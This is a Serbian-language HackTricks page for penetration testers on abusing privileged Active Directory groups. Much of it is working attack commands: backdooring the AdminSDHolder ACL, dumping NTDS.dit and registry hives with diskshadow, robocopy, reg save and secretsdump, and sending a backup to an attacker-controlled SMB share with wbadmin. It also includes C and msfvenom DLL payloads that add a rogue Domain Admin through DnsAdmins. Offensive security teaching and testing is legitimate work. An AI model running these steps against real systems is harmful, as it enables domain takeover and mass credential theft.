# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Pažnje poznate grupe sa administratorskim privilegijama

- **Administratori**
- **Administratori domena**
- **Administratori preduzeća**

## Operatori naloga

Ova grupa ima ovlašćenje da kreira naloge i grupe koje nisu administratori na domenu. Pored toga, omogućava lokalno prijavljivanje na Kontroler domena (DC).

Da bi se identifikovali članovi ove grupe, izvršava se sledeća komanda:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC01.

## AdminSDHolder grupa

Access Control List (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" unutar Active Directory-a, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava bezbednost ovih grupa sprečavanjem neovlašćenih izmena.

Napadač bi mogao da iskoristi ovo modifikovanjem ACL-a grupe **AdminSDHolder**, dodeljujući pune dozvole standardnom korisniku. Ovo bi efikasno dalo tom korisniku punu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika promene ili uklone, one bi se automatski ponovo uspostavile u roku od sat vremena zbog dizajna sistema.

Komande za pregled članova i modifikaciju dozvola uključuju:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Dostupan je skript za ubrzavanje procesa obnavljanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja, posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje obrisanih objekata Active Directory-a, što može otkriti osetljive informacije:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Pristup Kontroleru Domena

Pristup datotekama na DC-u je ograničen osim ako korisnik nije deo grupe `Server Operators`, što menja nivo pristupa.

### Eskalacija Privilegija

Korišćenjem `PsService` ili `sc` iz Sysinternals, može se pregledati i modifikovati dozvole servisa. Grupa `Server Operators`, na primer, ima potpunu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ova komanda otkriva da `Server Operators` imaju potpuni pristup, omogućavajući manipulaciju uslugama za povišene privilegije.

## Backup Operators

Članstvo u grupi `Backup Operators` pruža pristup `DC01` fajl sistemu zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju pretragu foldera, listanje i kopiranje fajlova, čak i bez eksplicitnih dozvola, koristeći `FILE_FLAG_BACKUP_SEMANTICS` flag. Korišćenje specifičnih skripti je neophodno za ovaj proces.

Da biste prikazali članove grupe, izvršite:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokalni Napad

Da bi se iskoristile ove privilegije lokalno, koriste se sledeći koraci:

1. Uvezi potrebne biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Omogućite i verifikujte `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pristupite i kopirajte datoteke iz ograničenih direktorijuma, na primer:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direktan pristup datotečnom sistemu kontrolera domena omogućava krađu `NTDS.dit` baze podataka, koja sadrži sve NTLM hešove za korisnike i računare u domenu.

#### Using diskshadow.exe

1. Kreirajte senku kopiju `C` diska:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopirajte `NTDS.dit` iz senčne kopije:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativno, koristite `robocopy` za kopiranje fajlova:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Izvucite `SYSTEM` i `SAM` za preuzimanje hash-a:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Preuzmite sve hash-e iz `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Korišćenje wbadmin.exe

1. Postavite NTFS fajl sistem za SMB server na mašini napadača i keširajte SMB akreditive na cilјnoj mašini.
2. Koristite `wbadmin.exe` za sistemsku rezervnu kopiju i ekstrakciju `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Za praktičnu demonstraciju, pogledajte [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Članovi **DnsAdmins** grupe mogu iskoristiti svoje privilegije da učitaju proizvoljni DLL sa SYSTEM privilegijama na DNS serveru, koji se često hostuje na kontrolerima domena. Ova sposobnost omogućava značajan potencijal za eksploataciju.

Da biste nabrojali članove DnsAdmins grupe, koristite:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Izvrši proizvoljni DLL

Članovi mogu naterati DNS server da učita proizvoljni DLL (bilo lokalno ili sa udaljenog dela) koristeći komande kao što su:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponovno pokretanje DNS usluge (što može zahtevati dodatne dozvole) je neophodno da bi se DLL učitao:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Za više detalja o ovom napadnom vektoru, pogledajte ired.team.

#### Mimilib.dll

Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, modifikujući ga da izvršava specifične komande ili reverzne shell-ove. [Pogledajte ovaj post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.

### WPAD zapis za MitM

DnsAdmins mogu manipulisati DNS zapisima da bi izveli napade Man-in-the-Middle (MitM) kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranih upita. Alati poput Responder-a ili Inveigh-a mogu se koristiti za spoofing i hvatanje mrežnog saobraćaja.

### Čitaoci događaja
Članovi mogu pristupiti dnevnicima događaja, potencijalno pronalazeći osetljive informacije kao što su lozinke u običnom tekstu ili detalji izvršavanja komandi:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ova grupa može da menja DACL-ove na objektu domena, potencijalno dodeljujući DCSync privilegije. Tehnike za eskalaciju privilegija koje koriste ovu grupu su detaljno opisane u Exchange-AD-Privesc GitHub repozitorijumu.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administratori

Hyper-V Administratori imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim Domen kontrolerima. To uključuje kloniranje aktivnih DC-ova i vađenje NTLM hash-eva iz NTDS.dit datoteke.

### Primer Iskorišćavanja

Mozilla Maintenance Service u Firefox-u može biti iskorišćen od strane Hyper-V Administratora za izvršavanje komandi kao SYSTEM. To uključuje kreiranje tvrdog linka do zaštićene SYSTEM datoteke i zamenu sa zlonamernim izvršnim fajlom:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Napomena: Eksploatacija hard linkova je ublažena u nedavnim Windows ažuriranjima.

## Organizacija Upravljanje

U okruženjima gde je **Microsoft Exchange** implementiran, posebna grupa poznata kao **Organizacija Upravljanje** ima značajne mogućnosti. Ova grupa ima privilegiju da **pristupa poštanskim sandučetima svih korisnika domena** i održava **potpunu kontrolu nad 'Microsoft Exchange Security Groups'** Organizacijskom Jedinicom (OU). Ova kontrola uključuje **`Exchange Windows Permissions`** grupu, koja se može iskoristiti za eskalaciju privilegija.

### Eksploatacija Privilegija i Komande

#### Operateri Štampača

Članovi grupe **Operateri Štampača** imaju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da **se lokalno prijave na Kontroler Domena**, isključe ga i upravljaju štampačima. Da bi iskoristili ove privilegije, posebno ako **`SeLoadDriverPrivilege`** nije vidljiv u neuzdignutom kontekstu, potrebno je zaobići Kontrolu Korisničkog Naloga (UAC).

Da biste naveli članove ove grupe, koristi se sledeća PowerShell komanda:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Za detaljnije tehnike eksploatacije vezane za **`SeLoadDriverPrivilege`**, treba konsultovati specifične bezbednosne resurse.

#### Korisnici daljinske radne površine

Članovima ove grupe je odobren pristup računarima putem protokola daljinske radne površine (RDP). Da bi se izbrojali ovi članovi, dostupne su PowerShell komande:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalje informacije o eksploataciji RDP-a mogu se naći u posvećenim resursima za pentesting.

#### Korisnici za daljinsko upravljanje

Članovi mogu pristupiti računarima putem **Windows Remote Management (WinRM)**. Enumeracija ovih članova se postiže kroz:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Za tehnike eksploatacije vezane za **WinRM**, treba konsultovati specifičnu dokumentaciju.

#### Server Operators

Ova grupa ima dozvole za izvođenje raznih konfiguracija na domen kontrolerima, uključujući privilegije za pravljenje rezervnih kopija i vraćanje, promenu sistemskog vremena i isključivanje sistema. Da biste nabrojali članove, komanda koja se koristi je:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Reference <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
